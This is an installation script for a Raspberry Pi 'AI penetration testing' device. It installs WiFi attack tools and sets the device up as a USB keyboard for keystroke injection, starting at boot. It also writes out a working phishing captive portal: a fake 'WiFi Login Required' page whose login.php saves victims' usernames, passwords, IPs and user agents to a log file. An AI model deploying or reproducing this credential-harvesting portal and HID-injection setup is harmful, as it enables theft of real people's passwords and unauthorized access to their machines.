#!/bin/bash

# Natasha AI Penetration Testing Tool
# Installation Script

# Exit on error
set -e

# Display banner
echo "=================================================="
echo "    Natasha AI Penetration Testing Tool Setup     "
echo "=================================================="
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root (use sudo)"
  exit 1
fi

# Check for Raspberry Pi
if ! grep -q "Raspberry Pi" /proc/device-tree/model 2>/dev/null; then
  echo "Warning: This doesn't appear to be a Raspberry Pi."
  echo "This script is designed for Raspberry Pi Zero 2 W."
  read -p "Continue anyway? (y/n) " -n 1 -r
  echo
  if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    exit 1
  fi
fi

# Create installation directory
INSTALL_DIR="/home/$SUDO_USER/natasha"
echo "Creating installation directory: $INSTALL_DIR"
mkdir -p "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR/logs"
mkdir -p "$INSTALL_DIR/scripts"
mkdir -p "$INSTALL_DIR/captures"
mkdir -p "$INSTALL_DIR/models"
mkdir -p "$INSTALL_DIR/templates"
mkdir -p "$INSTALL_DIR/portals"
mkdir -p "$INSTALL_DIR/fonts"

# Create generic portal directory
mkdir -p "$INSTALL_DIR/portals/generic"

# Create basic captive portal files
cat > "$INSTALL_DIR/portals/generic/index.html" << 'EOL'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f0f0f0; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; background-color: white; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="password"] { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 3px; }
        button { width: 100%; padding: 10px; background-color: #4285f4; color: white; border: none; border-radius: 3px; cursor: pointer; }
        button:hover { background-color: #3367d6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Login Required</h1>
        <p>Please enter your credentials to access the internet.</p>
        <form action="login.php" method="post">
            <div class="form-group">
                <label for="username">Username or Email:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
EOL

cat > "$INSTALL_DIR/portals/generic/login.php" << 'EOL'
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$date = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$log_entry = "Date: $date\nIP: $ip\nUser-Agent: $user_agent\nUsername: $username\nPassword: $password\n\n";
file_put_contents('credentials.log', $log_entry, FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f0f0f0; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; background-color: white; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>Connecting...</h1>
        <div class="loader"></div>
        <p style="text-align: center;">Please wait while we verify your credentials...</p>
    </div>
</body>
</html>
EOL

# Download DejaVu font for display
echo "Downloading fonts..."
wget -q https://dejavu-fonts.github.io/Files/dejavu-sans-ttf-2.37.zip -O /tmp/dejavu-fonts.zip
unzip -q /tmp/dejavu-fonts.zip -d /tmp/dejavu-fonts
cp /tmp/dejavu-fonts/dejavu-sans-ttf-*/ttf/DejaVuSansMono.ttf "$INSTALL_DIR/fonts/"
rm -rf /tmp/dejavu-fonts /tmp/dejavu-fonts.zip

# Update system
echo "Updating system packages..."
apt update
apt upgrade -y

# Install dependencies
echo "Installing system dependencies..."
apt install -y git python3-pip python3-dev python3-pil python3-numpy libopenjp2-7 libtiff5 python3-venv
apt install -y aircrack-ng wireshark-cli tcpdump nmap hostapd dnsmasq iptables-persistent
apt install -y build-essential python3-dev libssl-dev libffi-dev
apt install -y python3-spidev python3-rpi.gpio php

# Install Python dependencies
echo "Installing Python dependencies..."
pip3 install RPi.GPIO spidev pillow numpy scikit-learn joblib pycryptodome scapy netifaces psutil

# Try to install TensorFlow Lite if available
pip3 install tensorflow-lite || echo "TensorFlow Lite not available, skipping..."

# Enable SPI interface
echo "Enabling SPI interface..."
raspi-config nonint do_spi 0

# Configure USB OTG for HID emulation
echo "Configuring USB OTG for HID emulation..."
if ! grep -q "dtoverlay=dwc2" /boot/config.txt; then
  echo "dtoverlay=dwc2" >> /boot/config.txt
fi

if ! grep -q "dwc2" /etc/modules; then
  echo "dwc2" >> /etc/modules
fi

if ! grep -q "libcomposite" /etc/modules; then
  echo "libcomposite" >> /etc/modules
fi

# Create USB HID setup script
echo "Creating USB HID setup script..."
cat > /usr/local/bin/setup_usb_hid.sh << 'EOL'
#!/bin/bash

cd /sys/kernel/config/usb_gadget/
mkdir -p natasha
cd natasha

# USB device configuration
echo 0x1d6b > idVendor  # Linux Foundation
echo 0x0104 > idProduct # Multifunction Composite Gadget
echo 0x0100 > bcdDevice # v1.0.0
echo 0x0200 > bcdUSB    # USB2

# Device information
mkdir -p strings/0x409
echo "fedcba9876543210" > strings/0x409/serialnumber
echo "Natasha Security" > strings/0x409/manufacturer
echo "Penetration Testing Tool" > strings/0x409/product

# HID keyboard configuration
mkdir -p functions/hid.usb0
echo 1 > functions/hid.usb0/protocol
echo 1 > functions/hid.usb0/subclass
echo 8 > functions/hid.usb0/report_length

# HID report descriptor (keyboard)
echo -ne \\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0 > functions/hid.usb0/report_desc

# Create configuration
mkdir -p configs/c.1/strings/0x409
echo "HID Config" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower

# Link HID function to configuration
ln -s functions/hid.usb0 configs/c.1/

# Enable the gadget
ls /sys/class/udc > UDC
EOL

chmod +x /usr/local/bin/setup_usb_hid.sh

# Configure script to run at boot
if ! grep -q "setup_usb_hid.sh" /etc/rc.local; then
  # Check if rc.local exists and has exit 0 at the end
  if [ -f /etc/rc.local ]; then
    sed -i '/^exit 0/i /usr/local/bin/setup_usb_hid.sh' /etc/rc.local
  else
    # Create rc.local if it doesn't exist
    cat > /etc/rc.local << 'EOL'
#!/bin/sh -e
/usr/local/bin/setup_usb_hid.sh
exit 0
EOL
    chmod +x /etc/rc.local
  fi
fi

# Copy Natasha files
echo "Copying Natasha files..."
cp display_interface.py "$INSTALL_DIR/"
cp ai_engine.py "$INSTALL_DIR/"
cp hid_emulation.py "$INSTALL_DIR/"
cp wifi_attack.py "$INSTALL_DIR/"
cp main.py "$INSTALL_DIR/"
cp README.md "$INSTALL_DIR/"

# Set permissions
echo "Setting permissions..."
chown -R $SUDO_USER:$SUDO_USER "$INSTALL_DIR"

# Create systemd service
echo "Creating systemd service..."
cat > /etc/systemd/system/natasha.service << EOL
[Unit]
Description=Natasha AI Penetration Testing Tool
After=network.target

[Service]
ExecStart=/usr/bin/python3 $INSTALL_DIR/main.py
WorkingDirectory=$INSTALL_DIR
StandardOutput=inherit
StandardError=inherit
Restart=always
User=$SUDO_USER

[Install]
WantedBy=multi-user.target
EOL

# Enable service
echo "Enabling Natasha service..."
systemctl enable natasha.service

echo ""
echo "=================================================="
echo "    Installation Complete!                        "
echo "=================================================="
echo ""
echo "Natasha AI Penetration Testing Tool has been installed."
echo "The system will start automatically on next boot."
echo ""
echo "To start Natasha now, run:"
echo "  sudo systemctl start natasha.service"
echo ""
echo "To check status:"
echo "  sudo systemctl status natasha.service"
echo ""
echo "To view logs:"
echo "  sudo journalctl -u natasha.service"
echo ""
echo "Reboot recommended to complete setup."
echo "Would you like to reboot now? (y/n)"
read -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
  echo "Rebooting..."
  reboot
fi